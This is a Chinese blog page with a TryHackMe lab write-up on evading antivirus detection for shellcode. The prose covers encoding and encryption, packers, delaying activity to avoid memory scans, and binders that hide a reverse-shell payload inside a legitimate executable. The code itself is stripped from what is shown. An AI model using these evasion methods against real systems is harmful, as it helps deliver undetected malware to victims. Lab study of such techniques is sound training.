器相反的顺序解码所有内容因此我们首先将解码内容然后继续使用我们在编码器中所使用过的相同密钥来对解码结果进行处理下面是完整的代码可加载到内存并执行该文件可在目标机器中的以下路径找到在目标机器中创建该代码文件注意在实际使用时我们需要用我们之前在执行编码器时所得到的内容填充上述代码中的变量我们只是组合了一些在单独使用时会被所检测到的非常简单的技术最后让我们在目标机器上使用以下命令编译在目标机器中编译成功之后我们就可以得到一个可执行的文件了在正式执行该文件之前我们还需要在机器的终端设置一个监听器在机器中在大多数时候我们在网上找到的一些特定规避方法都可能无法成功使用因为软件针对这些方法的检测签名可能已经存在这就需要我们发挥一定想象力来定制方法以成功绕过常规的检测加壳器另一种可以对抗基于磁盘的检测的方法是使用加壳器加壳程序加壳器是一种软件它能够将一个程序作为输入并对其进行转换使这个程序的结构变得看起来不同但经过处理后的程序的功能还是会和原来保持完全相同加壳器这样做有两个主要目标压缩程序从而使其占用更少的空间保护程序免受逆向工程的侵害开发人员通常会使用加壳器来保护其软件免受逆向工程或破解的负面影响加壳器可以通过实现混合转换压缩加密添加调试保护等来对指定软件做到一定程度上的保护同样加壳器也经常可被用于对恶意软件进行混淆处理以使得恶意软件更难被所检测到市面上有相当多的加壳器包括等对应用程序进行加壳虽然每个加壳器的操作方式都不同但是让我们查看一下简单的加壳器的基本操作示例当应用程序被加壳时它将通过加壳函数以某种方式被转换加壳函数需要能够混淆和转换应用程序的原始代码并且这种混淆和转换方式可以通过脱壳函数进行合理地逆转以便保留应用程序的原始功能虽然有时候加壳器可能会添加一些代码例如添加一些能够使调试应用程序更加困难的代码但是它通常会希望能够在应用程序执行时恢复其原始代码应用程序的加壳版本将包含我们的被加壳的应用程序代码由于这个新的被加壳的代码已经被混淆因此应用程序需要能够经过脱壳得到原始代码为此加壳器将向加壳版本的应用程序嵌入一个包含脱壳器的代码存根并将相关可执行文件的主要入口点重定向到脱壳器当加壳版本的应用程序被执行时将会发生以下情况脱壳器首先会被执行因为这个可执行文件应用程序的入口点指向了它脱壳器将读取已加壳的应用程序代码脱壳器将经过脱壳得到的原始代码写入到内存中的某个位置并会将应用程序的执行流指向该位置加壳器和反病毒现在我们可以看到加壳器如何帮助绕过解决方案假设我们构建了一个反向可执行文件但是它会被反病毒软件标记为恶意软件因为该可执行文件会与已知签名相匹配在这种情况下我们可以使用加壳器来转换我们得到的反向可执行文件从而使其在目标计算机磁盘上不匹配任何已知签名然而解决方案仍然可以捕获已加壳的应用程序此处指加壳的反向可执行文件原因如下虽然可执行文件的原始代码可能会转换为无法识别的内容但是加壳版本的可执行文件会包含带有脱壳器的代码的存根如果脱壳器具有已知签名那么反病毒解决方案仍然可能根据脱壳器存根来标记任何已加壳的可执行文件在某些时候我们得到的已加壳可执行文件会将其原始代码脱壳到内存中以便可以执行它如果我们所尝试绕过的反病毒解决方案可以进行内存扫描那么代码在脱壳之后仍然可能会被检测到对我们的进行加壳让我们从基本的开始相关的完整代码如下该代码文件可以在目标计算机中找到相关路径为在目标机器中创建该代码文件上述有效载荷文件会采用所生成的并能将其注入到单独的线程中执行因此在实际操作时我们需要生成一个新的并将其填充到上述代码的变量中在中进行操作在实际使用时请填充值将上述命令生成的普通填充到有效载荷文件中然后再使用以下命令在目标机器中编译有效载荷文件在目标计算机中经过上述步骤我们能够得到一个可执行文件如果我们在目标机器中将该文件上传至页面我们将发现该文件会被反病毒软件所标记因为我们此时得到的可执行是一个未经过编码加密加壳的普通无阶段有效载荷接下来让我们对相同的有效载荷使用加壳器我们将使用加壳器来完成加壳操作因为我们的有效载荷是在上编程的注意为了方便操作加壳器的快捷方式已被预先放置在目标虚拟机的桌面文件夹中将要求我们指定一个用于在其中运行的文件夹我们可以选择桌面作为基本目录如下所示设置好基本目录之后我们将要加壳的可执行文件拖入到加壳器界面中即可让我们继续转到该加壳器的设置选项卡并选择我们的有效载荷文件完成选择后点击按钮为我们的有效载荷添加设置这会创建一个名为的规则我们还需要确保启用了压缩功能我们现在编辑规则并将预设项设置为最后我们转到该加壳器的选项卡并点击按钮即可完成上述操作之后我们就已经准备好了加壳版本的有效载荷文件我们可以将其上传至检查器页面我们也可以在上设置好监听器然后再在目标机器中执行加壳的有效载荷文件这样我们将在攻击机终端成功得到一个反向到目前为止不会出现任何问题但是一旦我们在攻击机上使用得到的反向执行命令那么目标机器中的软件就会注意到我们的行为并杀死我们的这是因为目标机器中的会挂钩某些调用并会在使用此类调用时进行内存扫描对于所生成的任何将被调用以及被检测补充为了不被内存扫描所轻易发现我们可以采取一些简单措施来避免检测等待一段时间我们可以再次尝试生成反向并等待大约五分钟时间然后再发送任何命令我们可能会发现这样能够成功绕过检测因为扫描内存是一项昂贵的操作所以解决方案会在我们启动进程之后执行一段时间并最终停止使用较小的有效载荷越小被检测到的可能性就越小如果我们使用来执行单个命令而不是得到一个反向那么软件将更难检测到它为了使用来执行单个命令我们将执行以下命令这样得到的会更小并且该最终所执行的会是单个命令我们还可以使用一个简单的技巧那就是用我们在攻击机中得到的反向运行虽然这样将检测到我们的并杀死相关进程但是可能并不会杀死我们刚刚生成的新每个解决方案的行为都会有所不同但在大多数时候它们会采用一些类似的检测方式因此我们在测试时所发现的任何奇怪行为都值得探索绑定器虽然绑定器不是绕过方法但是它在我们设计一个将被分发给最终用户的恶意有效载荷时也很重要是一种可以将两个或两个以上的可执行文件合并为单个可执行文件的程序当我们想要分发隐藏在另一个已知程序中的有效载荷时通常会使用绑定器来欺骗用户以使用户相信他们正在执行一个另外的程序虽然每个绑定器的工作方式可能略有不同但是它们基本上都会将我们的代码添加到合法的程序中并以某种方式执行它例如我们可以更改标头中的入口点见上图以便代码提前执行然后在完成执行之后再将执行流程重定向回合法的程序代码处这样当用户点击执行经过绑定器处理得到的可执行文件时我们的将首先以静默方式执行然后会继续正常运行普通程序代码让用户难以注意到使用进行绑定处理我们可以使用轻松地将我们想要使用的有效载荷植入到任何文件中被植入内容的二进制文件将正常工作但会静默执行额外的有效载荷所使用的绑定处理方法和我们刚才介绍的绑定器的机制相比略有不同但效果一致它将通过创建一个额外的线程来注入恶意程序拥有一个单独的线程效果会更好因为如果我们的由于某种原因执行失败我们的正常程序也不会被阻塞接下来我们将对目标机器上的可执行文件进行后门化处理要创建一个后门我们可以在目标机器上使用以下命令目标机器上也安装了但在上使用来生成可能需要长达三分钟的时间可以安全地忽略生成的警告最好还是使用生成在实际使用以下命令时请填充值上述生成的将在用户没有注意到的情况下执行有效载荷我们将预先在上设置一个监听器这样当我们在目标机上执行后门化的可执行文件时它就会让我们在攻击机上获得一个反向同时还会继续为目标机上的用户执行正常的绑定器和反病毒绑定器并不会做太多事情来隐藏我们的以面对解决方案在不进行任何更改的情况下即使我们通过简单地合并两个可执行文件得到了单个可执行文件这个单个可执行文件仍然会触发原始所对应的任何签名绑定器的主要用途是欺骗目标计算机上的用户让他们相信他们正在执行合法的可执行文件而不是恶意有效载荷当我们创建实际的有效载荷时可以组合使用编码加密和加壳来隐藏以对抗基于签名的反病毒软件同时我们还能将处理过的绑定到目标机器上已知的其他可执行文件中这样用户就不知道他们正在执行恶意有效载荷我们可以尝试将经过绑定处理得到的包含的可执行文件上传到页面此页面在目标机桌面上有对应链接注意我们在此不做任何加壳处理最终我们会从相关的服务器得到一个返回的检测结果我们会发现已上传的这个可执行文件将被标记为恶意软件最终实验任务结合上文所介绍的各种规避技术尝试绕过实验虚拟机上已安装的反病毒软件的检测进而捕获目标文件系统中的内容我们将在完成实验机器部署后我们将得到随机分配的目标页面上传文件此页面的链接可以在目标机器的桌面上找到在目标机器中新建一个具有如下内容的文件之后编译运行得到如下图所示结果我们对照即可得到回顾上述的免杀手法其中我们可以尝试进行编码加壳的方式来绕过最后我们在目标机上将加壳版本的上传到检查器页面当我们能够规避目标机上的软件时我们所上传的文件会自动执行得到总结在本文中我们探索了攻击者可以使用的一些简单策略来规避仅依赖于检测的反病毒引擎虽然我们所尝试规避的只是任何现代反病毒引擎可用的机制之一但作为免杀操作的第一步我们至少应该能够将有效载荷传递到目标机器的计算机磁盘上在后面的学习实践中我们还会学习如何绕过内存检测以及绕过其他的高级检测机制为了获取有关怎样绕过可能阻止触发有效载荷的进一步安全机制的更多信息我们可能需要学习运行时检测规避技术请记住任何针对有效载荷的加密编码加壳技术的成功很大程度上取决于我们所面对的反病毒引擎不知道经过处理后的恶意可执行文件的任何签名因此在尝试绕过任何实际的反病毒解决方案时能够自定义自己的有效载荷才是至关重要的事情',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-05 20:57:07',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-ShellCode免杀</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-08-01T09:44:20.000Z" title="发表于 2024-08-01 17:44:20">2024-08-01</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-05T12:57:07.626Z" title="更新于 2024-08-05 20:57:07">2024-08-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">20.3k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>76分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-ShellCode免杀"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/08/01/thm-shellcode-mian-sha/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/08/01/thm-shellcode-mian-sha/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/08/01/thm-shellcode-mian-sha/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-ShellCode免杀</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-08-01T09:44:20.000Z" title="发表于 2024-08-01 17:44:20">2024-08-01</time><time itemprop="dateCreated datePublished" datetime="2024-08-05T12:57:07.626Z" title="更新于 2024-08-05 20:57:07">2024-08-05</time></header><p>学习如何针对Shellcode使用编码、加密、加壳器和绑定器。</p>
<h1 id="0x01-简介">0x01 简介</h1>
<p>在本文中，我们将探讨如何构建和交付有效载荷，并且将侧重学习怎样规避常见的反病毒引擎的检测。我们将研究攻击者可以使用的不同AV规避(免杀)技术，并简单讨论每种规避技术的优缺点。</p>
<h2 id="学习目标">学习目标</h2>
<ul>
<li>了解shellcode是如何制作的。</li>
<li>探索分阶段(staged)有效载荷的优点和缺点。</li>
<li>创建隐秘的shellcode以尝试规避AV(反病毒)检测。</li>
</ul>
<h2 id="前置学习基础">前置学习基础</h2>
<p>建议先了解反病毒软件的工作原理以及了解基础的加密和编码知识，虽然不严格要求，但是能掌握一些基本的汇编语言知识对于学习本文也很有帮助，此外，还建议读者对阅读代码和理解函数(C、C#)能够有基本的了解。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17964131">【THM】Introduction to Antivirus(反病毒简介)-红队</a></li>
</ul>
<h1 id="0x02-挑战">0x02 挑战</h1>
